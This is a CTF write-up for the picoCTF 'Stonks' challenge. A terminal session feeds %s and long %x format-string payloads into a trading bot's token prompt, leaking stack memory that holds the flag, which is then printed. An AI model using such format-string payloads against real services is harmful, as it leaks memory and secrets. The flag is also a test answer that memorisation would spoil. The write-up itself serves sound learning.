# Stonks
#picoCTF 
## Descripción
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c) `nc mercury.picoctf.net 20195`

## Pistas 
+ Okay, maybe I'd believe you if you find my API key.

## Solución
```bash 
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/stonks]
└─$ wget https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c
--2023-05-21 17:30:49--  https://mercury.picoctf.net/static/e4d297ce964e4f54225786fe7b153b4b/vuln.c
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2744 (2.7K) [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                       100%[==============================================>]   2.68K  --.-KB/s    in 0s      

2023-05-21 17:30:49 (18.9 MB/s) - ‘vuln.c’ saved [2744/2744]

                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/stonks]
└─$ ls
vuln.c
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/stonks]
└─$ ./vuln
zsh: no such file or directory: ./vuln
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/stonks]
└─$ nano vuln.c                 
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/stonks]
└─$ nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
asdasdaa
Buying stonks with token:
asdasdaa
Portfolio as of Sun May 21 21:32:00 UTC 2023


4 shares of H
10 shares of K
16 shares of W
1 shares of ZCWA
64 shares of K
97 shares of V
645 shares of LCFX
762 shares of HYE
Goodbye!
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/stonks]
└─$ nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
%s%s%s%s%s%s%s%s%s
Goodbye!
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/stonks]
└─$ nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%s%s%s%s%s%s%s%s%s
Buying stonks with token:
timeout: the monitored command dumped core
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/stonks]
└─$ nc mercury.picoctf.net 20195
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
9a613f0804b00080489c3f7f1dd80ffffffff19a5f160f7f2b110f7f1ddc709a6018019a613d09a613f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3534303664303664ff96007df7f58af8f7f2b4404a6e660010f7dbace9f7f2c0c0f7f1d5c0f7f1d000ff966d58f7dab68df7f1d5c08048ecaff966d640f7f3ff09804b000f7f1d000f7f1de20ff966d98f7f45d50f7f1e8904a6e6600f7f1d000804b000ff966d988048c869a5f160ff966d84ff966d988048be9f7f1d3fc0ff966e4cff966e44119a5f1604a6e6600ff966db000f7d60fa1f7f1d000f7f1d0000f7d60fa11ff966e44ff966e4cff966dd410f7f1d000f7f4070af7f580000f7f1d00000d2dd0d055218ab15000180486300f7f45d50f7f40960804b00018048630080486628048b851ff966e448048cd08048d30f7f40960ff966e3cf7f589401ff967e790ff967eb2ff967ebfff967ec8ff967ef7ff967f2fff967f4aff967f6bff967f73020f7f30b5021f7f30000101f8bfbff6
Portfolio as of Sun May 21 21:39:52 UTC 2023


1 shares of LBB
43 shares of MD
18 shares of V
12 shares of COST
141 shares of K
277 shares of GOE
617 shares of BR
472 shares of EY
Goodbye!
                                                                                                                    
┌──(kali㉿kali)-[~/picoctf/BinaryExplotation/stonks]
└─$ 
```
![[stonks.png]]
![[stonks1.png]]
## Bandera
picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}

## Notas adicionales
| comando | descripción |
|------------|---------------|
| xx | xx |

## Referencias
